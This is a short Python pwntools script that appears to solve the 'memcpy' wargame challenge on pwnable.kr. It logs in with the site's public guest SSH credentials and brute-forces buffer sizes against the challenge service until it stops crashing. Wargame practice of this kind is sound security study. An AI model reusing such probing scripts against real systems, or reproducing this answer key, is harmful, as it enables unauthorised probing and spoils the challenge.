#! /usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import random

s =  ssh(host='pwnable.kr',port=2222, user='memcpy', password='guest')

for i in range(128, 256 + 1):
    try:
        c = s.remote('0', 9022)
        print('pruebo con:{}'.format(i))
        c.recvuntil('8 ~ 16 : ')
        c.sendline('16')
        c.recvuntil('16 ~ 32 : ')
        c.sendline('32')
        c.recvuntil('32 ~ 64 : ')
        c.sendline('64')
        c.recvuntil('64 ~ 128 : ')
        c.sendline('64')
        c.recvuntil('128 ~ 256 : ')
        c.sendline(str(i))
        c.recvuntil('256 ~ 512 : ')
        c.sendline('512')
        c.recvuntil('512 ~ 1024 : ')
        c.sendline('1024')
        c.recvuntil('1024 ~ 2048 : ')
        c.sendline('2048')
        c.recvuntil('2048 ~ 4096 : ')
        c.sendline('4096')
        c.recvuntil('4096 ~ 8192 : ')
        c.sendline('8192')
        
        c.recvuntil('memcpy with buffer size ' + str(i) + '\n')
        line = c.recvline()
        line = c.recvline()
    except EOFError:
        pass
    else:
        exit('Exito:{}'.format(i))

exit('Failed!')
